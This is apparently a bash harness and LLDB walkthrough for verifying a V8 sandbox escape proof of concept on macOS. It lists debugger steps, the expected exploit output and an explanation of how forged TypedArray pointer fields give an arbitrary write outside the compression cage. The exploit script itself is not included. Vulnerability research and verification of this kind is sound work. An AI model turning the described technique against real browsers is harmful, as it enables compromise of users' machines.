#!/bin/bash
# V8 Sandbox Escape + Calculator Popup — LLDB verification workflow
# Platform: macOS ARM64
# Build: d8 with --sandbox-testing support (arm64_vuln)
#
# This script documents the full LLDB session for verifying the sandbox escape
# and triggering Calculator.app via os.system().
#
# Usage: run interactively — copy-paste the LLDB commands below.

set -e

D8=/tmp/v8_build/v8/out/arm64_vuln/d8
JS=/tmp/v8_build/v8/out/arm64_vuln/calc_pop.js
SNAPSHOT=/tmp/v8_build/v8/out/arm64_vuln/snapshot_blob.bin

echo "=== V8 Sandbox Escape / Calculator Popup — LLDB Verification ==="
echo ""
echo "Step 1: Launch d8 under LLDB"
echo "  lldb $D8 -- --sandbox-testing --enable-os-system --expose-gc $JS"
echo ""
echo "Step 2: Set breakpoint to bypass SandboxTesting::Enable FATAL (macOS-only)"
echo "  (lldb) breakpoint set -n \"v8::internal::SandboxTesting::Enable\""
echo "  (lldb) run"
echo ""
echo "Step 3: When breakpoint hits, skip the FATAL crash and return immediately"
echo "  (lldb) thread return"
echo "  (lldb) continue"
echo ""
echo "--- LLDB commands for manual OOB write watchpoint verification ---"
echo ""
echo "After running, the JS prints the target address.  Then:"
echo ""
echo "  # Optional: set a watchpoint on the sentinel dword before the fill"
echo "  # (get absolute addr from JS output: sandbox_base + offset printed by script)"
echo "  (lldb) watchpoint set memory -w write -s 4 <absolute_target_addr>"
echo ""
echo "  # Continue; watchpoint fires when ta.fill(0x41) overwrites 0xDEADBEEF"
echo "  (lldb) continue"
echo ""
echo "  # Read memory to confirm 0xDEADBEEF → 0x41414141"
echo "  (lldb) memory read --size 4 --format x <absolute_target_addr>"
echo "  # Expected: 0x41414141"
echo ""
echo "--- Expected JS output ---"
echo "  [+] ta displaced → sandbox+0x1200000100 (cage_base at +72 GiB)"
echo "  [+] cage_base at sandbox+0x1200000000 (72 GiB)"
echo "  [+] Write target: sandbox+0x14xxxxxxxx (84.x GiB)"
echo "      — 12.x GiB above cage_base, outside the 4 GiB compression cage"
echo "  [!!!] SANDBOX ESCAPE SUCCESS"
echo "        Wrote 0x41 to sandbox+84.x GiB"
echo "        (12.x GiB outside the compression cage)"
echo "        WriteSandboxedPointerField CHECK bypassed entirely"
echo "  [+] Calculator launched"
echo ""
echo "=== Why this is a sandbox escape ==="
echo ""
echo "  The V8 sandbox's compression cage is a 4 GiB VAS window anchored at"
echo "  cage_base.  SandboxedPointer fields are decoded as:"
echo "    ptr = cage_base + (encoded_value >> kSandboxedPointerShift)"
echo "  WriteSandboxedPointerField() CHECKs that the pointer is inside the cage"
echo "  before encoding it.  This exploit chains GC forwarding records to"
echo "  displace a JSArray's backing store >12 GiB above cage_base, then forges"
echo "  the TypedArray ExternalPointer field directly (bypassing the CHECK) to"
echo "  achieve an arbitrary write 12+ GiB outside the compression cage."
echo ""
echo "  Result: attacker-controlled write anywhere in the 1 TiB sandbox, defeating"
echo "  cage isolation, the core invariant of the V8 sandbox design."

echo ""
echo "=== Launching d8 under LLDB now ==="
echo "(Follow the interactive prompts above inside the LLDB session)"
echo ""

# Check binaries exist
if [ ! -f "$D8" ]; then
  echo "ERROR: d8 not found at $D8"
  exit 1
fi
if [ ! -f "$JS" ]; then
  echo "ERROR: exploit not found at $JS"
  echo "Copy calc_pop.js from the repo to $JS first"
  exit 1
fi
if [ ! -f "$SNAPSHOT" ]; then
  echo "ERROR: snapshot_blob.bin not found at $SNAPSHOT"
  echo "Generate with: /tmp/v8_build/v8/out/arm64_noharden/arm64_vuln/mksnapshot --startup_blob=$SNAPSHOT"
  exit 1
fi

exec lldb "$D8" -- --sandbox-testing --enable-os-system --expose-gc "$JS"
